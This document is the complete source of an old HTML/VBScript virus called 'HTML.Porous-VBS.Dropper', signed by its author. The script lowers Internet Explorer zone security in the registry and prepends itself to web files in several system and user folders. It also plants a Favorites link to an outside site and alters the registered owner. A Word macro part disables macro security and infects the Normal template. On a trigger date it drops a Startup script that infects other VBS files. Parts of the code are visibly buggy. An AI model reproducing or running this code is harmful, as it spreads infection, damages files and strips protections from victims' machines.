<!--Porous-->
<HTML><HEAD><TITLE>HTML.Porous-VBS.Dropper</TITLE></HEAD>
<BODY>
<Script Language="VBScript">
<!--
'HTML.Porous
'By a.v_killer
On Error Resume Next
If Location.protocol = "file:" Then
 Randomize
 Set WshShell = CreateObject("WScript.Shell")
 WshShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201", 0, "REG_DWORD"
 WshShell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201", 0, "REG_DWORD"
  If Location.protocol = "file:" Then
   Set FSO = CreateObject("Scripting.FileSystemObject")
   HPath = Replace(Location.href, "/", "\")
   HPath = Replace(HPath, "file:\\\", "")
   HPath = FSO.GetParentFolderName(HPath)
   Set TRange = Document.body.createTextRange
   Call GetFolder(HPath)
   Call GetFolder("C:\My Documents")
   Call GetFolder("C:\Windows\Desktop")
   Call GetFolder("C:\Inetpub\wwwroot")
    Call GetFolder("C:\Windows\SYSTEM")
   Call GetFolder("C:\Program Files")
 End If
 If Day(Now()) = Int(Rnd * 6) + 1 Then
   MsgBox ("Hello World!")
   Set PorousLink = WshShell.CreateShortcut("C:\WINDOWS\Favorites\Porous.URL")
   PorousLink.TargetPath = "http://www.funkyvxer.8k.com/"
   PorousLink.Save
   WshShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RegisteredOwner", "Porous"
 End If
End If
Sub GetFolder(InfPath)
On Error Resume Next
If FSO.FolderExists(InfPath) Then
 Do
  Set FolderObj = FSO.GetFolder(InfPath)
  InfPath = FSO.GetParentFolderName(InfPath)
  Set FO = FolderObj.Files
  For Each Target In FO
    ExtName = LCase(FSO.GetExtensionName(Target.Name))
    If ExtName = "htt" Or ExtName = "asp" Or ExtName = "htm" Or ExtName = "hta" Or ExtName = "htx" Or ExtName = "html" Then
    Set POROUS = FSO.OpenTextFile(Target.Path, 1, False)
    If POROUS.readline <> "<!--Porous-->" Then
    Porous.close()
    GetFile (Target.Path)
    Else
     Porous.close()
    End If
  End If
  Next
  Loop Until FolderObj.IsRootFolder = True
End If
End Sub

Sub GetFile(GetFileName)
Set POROUS = FSO.OpenTextFile(GetFileName, 1, False)
FileContents = Real.ReadAll()
Porous.close()
Set POROUS = FSO.OpenTextFile(GetFileName, 2, False)
POROUS.WriteLine "<!--Porous-->"
POROUS.Write ("<html><body>" + Chr(13) + Chr(10))
POROUS.WriteLine TRange.htmlText
POROUS.WriteLine ("</body></html>")
POROUS.Write (FileContents)
Porous.close()
End Sub

Sub WordDROP()
On Error Resume Next
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Ofice\9.0\Word\Security", "Level") <> "" Then
CommandBars("Macro").Controls("Security...").Enabled = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
Else
CommandBars("Tools").Controls("Macro").Delete
Options.ConfirmConversions = (1 - 1): Options.VirusProtection = (1 - 1): Options.SaveNormalPrompt = (1 - 1)
End If
POROUS = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
Application.EnableCancelKey = 0
Options.ConfirmConversions = 0
POROUS = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If POROUS > 0 Then GoTo food
If POROUS = 0 Then
Set KKS = ActiveDocument.VBProject.VBComponents.Item(1)
DE82 = True
End If
If POROUS = 0 Then
Set KKS = NormalTemplate.VBProject.VBComponents.Item(1)
Drop = True
End If
If Drop <> True And DE82 <> True Then GoTo food
If Drop = True Then KKS.CodeModule.AddFromString ("Sub Document_Close()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, po - 1))
If DE82 = True Then KKS.CodeModule.AddFromString ("Sub Document_Open()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, rous - 1))
If Month(Now) = 12 And Day(Now) = 14 Then
Open "c:\windows\startm~1\progra~1\autost~1\porous.vbs" For Output As 1
Print #1, " 'trip"
Print #1, " 'HTML.porous-VBS.Dropper by a.v_killer"
Print #1, " Set FSO = CreateObject(""Scripting.FileSystemObject"")"
Print #1, " Set OpenSelf = FSO.OpenTextFile(Wscript.ScriptFullName, 1, True)"
Print #1, " Self = OpenSelf.Read(753)"
Print #1, " Set CurrentDirectory = FSO.GetFolder(""."").Files"
Print #1, " For Each ScriptFiles In CurrentDirectory"
Print #1, " ExtName = LCase(FSO.GetExtensionName(ScriptFiles.Path))"
Print #1, " If ExtName = ""vbs"" Or ExtName = ""vbe"" Then"
Print #1, " Set Scripts = FSO.OpenTextFile(ScriptFiles.Path, 1, True)"
Print #1, " If Scripts.ReadLine <> ""'trip"" Then"
Print #1, " Set Scripts = FSO.OpenTextFile(ScriptFiles.Path, 1, True)"
Print #1, " ScriptsSource = Scripts.ReadAll"
Print #1, " Set WriteScripts = FSO.OpenTextFile(ScriptFiles.Path, 2, True)"
Print #1, " WriteScripts.WriteLine Self"
Print #1, " WriteScripts.WriteLine ScriptsSource"
Print #1, " End If"
Print #1, " End If"
Print #1, " Next"
Close 1
End If
food:
End Sub

-->
</script>
<CENTER>
<Font Size="6" Face="Arial"><P>
HTML.Porous -VBS.Dropper<BR>By a.v_killer <BR><BR>
<MARQUEE BGCOLOR="#008080"><FONT COLOR="#FFFFFF"><B>Porous
</B></FONT></MARQUEE>
Do not edit this file with a HTML editor
<CENTER>
</BODY></HTML>
